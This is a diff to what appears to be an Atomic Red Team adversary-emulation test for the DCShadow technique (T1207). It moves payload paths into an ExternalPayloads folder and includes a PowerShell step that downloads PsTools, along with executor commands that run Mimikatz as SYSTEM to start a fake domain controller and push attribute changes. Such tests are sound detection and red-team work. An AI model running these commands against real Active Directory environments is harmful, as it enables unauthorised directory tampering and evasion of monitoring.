@@ -32,11 +32,11 @@ atomic_tests:
     mimikatz_path:
       description: Mimikatz windows executable
       type: path
-      default: '$env:TEMP\mimikatz\x64\mimikatz.exe'
+      default: 'PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe'
     psexec_path:
       description: Path to PsExec
       type: path
-      default: C:\PSTools\PsExec.exe
+      default: PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -57,25 +57,25 @@ atomic_tests:
     prereq_command: |
       if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
-      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
+      Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
       New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
-      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "#{psexec_path}" -Force
   executor:
     name: powershell
     elevation_required: true
     command: |
       # starting fake DC server, as SYSTEM (required)
-      $dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
+      $dc_output_file = "PathToAtomicsFolder\..\ExternalPayloads\art-T1207-mimikatz-DC.log"
       Remove-Item $dc_output_file -ErrorAction Ignore
       $mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`" `"exit`""
-      $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"
+      $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam"
 
       # wait for fake DC server to be ready...
       Start-Sleep -Seconds 5
 
       # server ready, so trigger replication (push) and wait until it finished
-      & #{mimikatz_path} "lsadump::dcshadow /push" "exit"
+      & "#{mimikatz_path}" "lsadump::dcshadow /push" "exit"
 
       Write-Host "`nWaiting for fake DC server to return"
       Wait-Process $dc
